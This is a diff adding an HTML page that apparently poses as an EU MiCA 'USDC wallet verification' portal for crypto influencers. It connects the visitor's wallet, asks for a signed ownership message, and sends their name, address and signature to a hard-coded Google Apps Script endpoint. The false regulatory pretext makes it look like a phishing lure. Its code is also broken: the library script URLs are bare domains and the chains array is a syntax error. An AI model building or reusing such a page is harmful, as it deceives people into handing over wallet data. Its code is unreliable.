@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MiCA Multi-Chain USDC Verification</title>
+  
+  <!-- Load official, modern modules for WalletConnect AppKit and Ethers directly -->
+  <script src="https://unpkg.com" type="text/javascript"></script>
+  <script src="https://cloudflare.com" type="text/javascript"></script>
+  
+  <style>
+    body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f4f6f9; color: #333; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .container { background: #ffffff; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); padding: 30px; max-width: 450px; width: 100%; text-align: center; }
+    h2 { color: #1e3a8a; margin-top: 0; }
+    p { font-size: 14px; color: #555; line-height: 1.5; }
+    .input-group { margin: 15px 0; text-align: left; }
+    label { font-weight: 600; font-size: 13px; color: #475569; display: block; margin-bottom: 6px; }
+    input[type="text"], select { width: 100%; padding: 10px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; font-size: 14px; background: white; }
+    .btn { background-color: #2563eb; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-size: 15px; font-weight: bold; width: 100%; transition: background 0.2s; margin-top: 15px; }
+    .btn:hover { background-color: #1d4ed8; }
+    .btn:disabled { background-color: #cbd5e1; cursor: not-allowed; }
+    .status { margin-top: 15px; font-weight: 600; font-size: 14px; padding: 10px; border-radius: 6px; display: none; }
+    .success { background-color: #dcfce7; color: #15803d; }
+    .error { background-color: #fee2e2; color: #b91c1c; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h2>USDC Wallet Verification</h2>
+  <p>To comply with EU MiCA/TFR rules for payouts <strong>above €1,000</strong>, please verify your wallet ownership using any mobile crypto wallet. This process is secure and completely free.</p>
+  
+  <div class="input-group">
+    <label for="kolName">Your Name / Channel Name</label>
+    <input type="text" id="kolName" placeholder="e.g., CryptoWhale Official">
+  </div>
+
+  <div class="input-group">
+    <label for="networkType">USDC Payout Network</label>
+    <select id="networkType">
+      <option value="Ethereum">Ethereum Mainnet</option>
+      <option value="Polygon">Polygon POS Network</option>
+      <option value="Arbitrum">Arbitrum Layer-2</option>
+      <option value="Base">Base Layer-2</option>
+    </select>
+  </div>
+
+  <button class="btn" id="connectBtn" onclick="startVerification()">Connect & Verify Wallet</button>
+  
+  <div id="statusBox" class="status"></div>
+</div>
+
+<script>
+// ==================== CONFIGURATION ====================
+// 1. PASTE YOUR GOOGLE SHEET WEB APP URL HERE:
+const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxKa5YTyB8puc6TLW2I5fZOv9KY1KO9hHlOD_HVozj0j8NzZ7_9J6D8ZYES00xZt9RoBg/exec";
+
+// 2. PUBLIC FREE WALLETCONNECT INSTANCE PROJECT ID (DO NOT CHANGE):
+const WALLETCONNECT_PROJECT_ID = "c4a7e93736780c850787e9eb0ef6e384";
+// ========================================================
+
+let modalInstance = null;
+
+// Initialize WalletConnect AppKit for EVM networks dynamically
+function initWalletModal() {
+  if (modalInstance) return modalInstance;
+  
+  const mainnetMetadata = {
+    name: 'MiCA Compliance Dashboard',
+    description: 'Wallet Verification Portal',
+    url: window.location.origin,
+    icons: ['https://githubusercontent.com']
+  };
+
+  // Configure target verification networks for your USDC selections
+  const chains =; // Ethereum, Polygon, Arbitrum, Base IDs
+
+  modalInstance = window.Web3ModalEthers5.createWeb3Modal({
+    ethersConfig: window.Web3ModalEthers5.defaultEthersConfig({ metadata: mainnetMetadata }),
+    chains: chains,
+    projectId: WALLETCONNECT_PROJECT_ID,
+    enableAnalytics: false
+  });
+  return modalInstance;
+}
+
+function showStatus(msg, type) {
+  const statusBox = document.getElementById('statusBox');
+  statusBox.innerText = msg;
+  statusBox.className = "status " + type;
+  statusBox.style.display = "block";
+}
+
+async function startVerification() {
+  const kolName = document.getElementById('kolName').value.trim();
+  const selectedNetwork = document.getElementById('networkType').value;
+  const connectBtn = document.getElementById('connectBtn');
+
+  if (!kolName) {
+    showStatus("Please enter your name or channel before verifying.", "error");
+    return;
+  }
+  if (GOOGLE_SCRIPT_URL.includes("YOUR_GOOGLE")) {
+    showStatus("Configuration Error: Please assign your target GOOGLE_SCRIPT_URL script target inside index.html.", "error");
+    return;
+  }
+
+  try {
+    connectBtn.disabled = true;
+    showStatus("Opening secure QR wallet selector window...", "success");
+
+    const modal = initWalletModal();
+    // Force open the QR interface / App selector modal overlay on the page
+    await modal.open();
+
+    // Loop monitoring until user links their mobile wallet interface successfully
+    let walletAddress = null;
+    let provider = null;
+    
+    while (!walletAddress) {
+      const currentProvider = modal.getWalletProvider();
+      if (currentProvider) {
+        provider = new ethers.providers.Web3Provider(currentProvider);
+        const signer = provider.getSigner();
+        walletAddress = await signer.getAddress();
+      }
+      await new Promise(resolve => setTimeout(resolve, 1000));
+    }
+
+    // Generate strict compliance statement proving ownership keys
+    const msgToSign = `MiCA Compliance Verification\nI confirm that I own and control the wallet address for USDC payouts: ${walletAddress}\nAuthorized by: ${kolName}`;
+    
+    showStatus("Connection secured! Please tap 'Sign Message' inside your phone's wallet app...", "success");
+    const signerInstance = provider.getSigner();
+    const signature = await signerInstance.signMessage(msgToSign);
+
+    showStatus("Cryptographic signature validated. Routing to Google Sheet dashboard...", "success");
+
+    // Route structural data packet securely back to Google API architecture
+    await fetch(GOOGLE_SCRIPT_URL, {
+      method: "POST",
+      mode: "no-cors", 
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        kolName: kolName,
+        network: selectedNetwork,
+        walletAddress: walletAddress,
+        signature: signature
+      })
+    });
+
+    showStatus(`Success! Your ${selectedNetwork} wallet was logged under MiCA rules. You may now close this window.`, "success");
+    connectBtn.innerText = "Verified ✅";
+    modal.disconnect();
+
+  } catch (error) {
+    showStatus("Verification failed: " + (error.message || error), "error");
+    connectBtn.disabled = false;
+    if (modalInstance) modalInstance.disconnect();
+  }
+}
+</script>
+
+</body>
+</html>
